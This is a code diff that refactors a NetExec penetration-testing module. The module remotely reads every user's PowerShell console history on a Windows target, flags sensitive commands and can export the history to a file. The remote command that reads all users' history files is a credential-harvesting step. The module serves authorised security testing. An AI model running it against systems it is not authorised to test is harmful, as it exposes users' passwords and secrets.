@@ -1,6 +1,6 @@
 import traceback
 import os
-from impacket.examples.secretsdump import RemoteOperations
+
 
 class NXCModule:
     """Module by @357384n"""
@@ -14,22 +14,8 @@ class NXCModule:
     def options(self, context, module_options):
         """To export all the history you can add the following option: -o export=enable"""
         context.log.info(f"Received module options: {module_options}")
-        self.export = module_options.get('EXPORT', 'disable').lower()
+        self.export = module_options.get("EXPORT", "disable").lower()
         context.log.info(f"Option export set to: {self.export}")
-
-    def execute_command(self, connection, command):
-        """Execute a command on the remote system and return the output."""
-        output = connection.execute(command, True)
-        return output
-
-    def get_powershell_history(self, connection):
-        """Get the PowerShell history for all users."""
-        history_paths_command = 'powershell.exe "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"'
-        try:
-            history_output = self.execute_command(connection, history_paths_command)
-            return history_output.split('\n')
-        except Exception as e:
-            raise Exception(f"Could not retrieve PowerShell history: {e}")
 
     def analyze_history(self, history):
         """Analyze PowerShell history for sensitive information."""
@@ -50,7 +36,8 @@ class NXCModule:
         """Main function to retrieve and analyze PowerShell history."""
         try:
             context.log.info("Retrieving PowerShell history...")
-            history = self.get_powershell_history(connection)
+            command = 'powershell.exe "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"'
+            history = connection.execute(command, True).split("\n")
             if history:
                 sensitive_commands = self.analyze_history(history)
                 if sensitive_commands:
@@ -64,7 +51,7 @@ class NXCModule:
 
             # Check if export is enabled
             context.log.info(f"Export option is set to: {self.export}")
-            if self.export == 'enable':
+            if self.export == "enable":
                 host = connection.host  # Assuming 'host' contains the target IP or hostname
                 filename = f"{host}.powershell_history.txt"
                 context.log.info(f"Export enabled, writing history to {filename}")
